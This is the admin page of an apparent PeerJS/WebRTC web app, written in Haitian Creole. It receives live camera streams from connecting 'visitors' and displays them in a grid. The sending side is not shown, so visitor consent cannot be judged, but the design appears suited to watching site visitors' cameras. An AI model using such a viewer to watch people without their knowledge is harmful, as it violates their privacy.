<!DOCTYPE html>
<html lang="ht">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin - Wè Visitor yo</title>
<style>
  * { box-sizing: border-box; }
  body {
    background: #111;
    color: white;
    font-family: system-ui, sans-serif;
    padding: 20px;
    margin: 0;
    min-height: 100vh;
  }
  h1 {
    text-align: center;
    color: #00cc66;
    margin-bottom: 5px;
  }
  #status {
    text-align: center;
    color: #ccc;
    font-size: 14px;
    margin-bottom: 20px;
  }

  /* Lis visitor yo */
  .visitor-list {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    justify-content: center;
    margin-bottom: 20px;
  }
  .visitor-btn {
    background: #1c1c1c;
    color: #ccc;
    border: 1px solid #333;
    padding: 8px 14px;
    border-radius: 20px;
    font-size: 13px;
    cursor: pointer;
    transition: all 0.2s;
  }
  .visitor-btn:hover {
    background: #2a2a2a;
  }
  .visitor-btn.active {
    background: #00cc66;
    color: white;
    border-color: #00cc66;
  }
  .visitor-btn.offline {
    opacity: 0.4;
  }

  /* Videyo grid */
  #videoGrid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
    gap: 15px;
    margin-top: 20px;
  }
  .video-card {
    background: #1c1c1c;
    border-radius: 12px;
    padding: 10px;
    text-align: center;
    border: 1px solid #333;
  }
  .video-card.focused {
    border-color: #00cc66;
    box-shadow: 0 0 20px rgba(0, 204, 102, 0.4);
  }
  .video-card video {
    width: 100%;
    border-radius: 8px;
    background: #000;
    display: block;
  }
  .video-card p {
    margin-top: 8px;
    font-size: 12px;
    color: #999;
    word-break: break-all;
  }
  .empty {
    text-align: center;
    color: #666;
    padding: 40px 20px;
    grid-column: 1 / -1;
  }
</style>
</head>
<body>

  <h1>🎥 Visitor yo an Dirèk</h1>
  <p id="status">⏳ Ap konekte ak sèvè a...</p>
  <div class="visitor-list" id="visitorList"></div>
  <div id="videoGrid">
    <div class="empty">Ap tann visitor yo konekte...</div>
  </div>

<script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
<script>
(() => {
  const ADMIN_PEER_ID = "camadmin-piyayy-2026";

  const peer = new Peer(ADMIN_PEER_ID, {
    config: {
      iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" }
      ]
    }
  });

  const grid = document.getElementById("videoGrid");
  const status = document.getElementById("status");
  const visitorList = document.getElementById("visitorList");

  // Objè pou kenbe tras tout visitor yo
  const visitors = {}; // { visitorId: { call, video, card, label, stream } }

  peer.on("open", (id) => {
    console.log("✅ Admin ID:", id);
    status.innerText = "✅ Ou konekte. Ap tann visitor yo...";
    const empty = grid.querySelector(".empty");
    if (empty) empty.remove();
  });

  peer.on("call", (call) => {
    const visitorId = call.peer;
    console.log("📞 Visitor konekte:", visitorId);

    // Si visitor sa a te deja la, fèmen ansyen an
    if (visitors[visitorId]) {
      if (visitors[visitorId].call) visitors[visitorId].call.close();
    }

    call.answer();

    // Kreye yon kat videyo
    const card = document.createElement("div");
    card.className = "video-card";
    card.dataset.visitorId = visitorId;

    const video = document.createElement("video");
    video.autoplay = true;
    video.playsInline = true;
    video.muted = true;

    const label = document.createElement("p");
    label.innerText = "Visitor: " + visitorId;

    card.appendChild(video);
    card.appendChild(label);
    grid.appendChild(card);

    // Kreye yon bouton nan lis la
    let btn = visitorList.querySelector(`[data-id="${visitorId}"]`);
    if (!btn) {
      btn = document.createElement("button");
      btn.className = "visitor-btn";
      btn.dataset.id = visitorId;
      btn.innerText = "👤 " + visitorId.substring(0, 12) + "...";
      visitorList.appendChild(btn);

      // Klike sou bouton an → scroll nan videyo a
      btn.addEventListener("click", () => {
        // Retire aktiv sou tout bouton
        visitorList.querySelectorAll(".visitor-btn").forEach(b => b.classList.remove("active"));
        btn.classList.add("active");

        // Scroll nan videyo a
        card.scrollIntoView({ behavior: "smooth", block: "center" });

        // Mete focus vizyèl
        grid.querySelectorAll(".video-card").forEach(c => c.classList.remove("focused"));
        card.classList.add("focused");
      });
    }

    // Sove referans
    visitors[visitorId] = { call, video, card, btn, label, stream: null };

    // Lè stream rive
    call.on("stream", (remoteStream) => {
      console.log("🎥 Stream rive pou:", visitorId);
      video.srcObject = remoteStream;
      visitors[visitorId].stream = remoteStream;
      updateStatus();
    });

    // Lè visitor dekonekte
    call.on("close", () => {
      console.log("❌ Visitor dekonekte:", visitorId);
      card.remove();
      btn.remove();
      delete visitors[visitorId];
      updateStatus();
    });

    // Lè gen erè
    call.on("error", (err) => {
      console.warn("Erè call:", err);
      card.remove();
      btn.remove();
      delete visitors[visitorId];
      updateStatus();
    });

    updateStatus();
  });

  function updateStatus() {
    const count = Object.keys(visitors).length;
    status.innerText = count > 0
      ? `🟢 ${count} visitor konekte`
      : "⏳ Ap tann visitor yo...";

    // Retire mesaj "ap tann" si gen visitor
    if (count > 0) {
      const empty = grid.querySelector(".empty");
      if (empty) empty.remove();
    } else {
      if (!grid.querySelector(".empty")) {
        const empty = document.createElement("div");
        empty.className = "empty";
        empty.innerText = "Ap tann visitor yo konekte...";
        grid.appendChild(empty);
      }
    }
  }

  peer.on("error", (err) => {
    console.warn("Erè PeerJS:", err);
    status.innerText = "❌ Erè: " + err.type;
  });

  peer.on("disconnected", () => {
    console.log("⚠️ Admin dekonekte, ap rekonekte...");
    if (peer && !peer.destroyed) peer.reconnect();
  });
})();
</script>
</body>
</html>
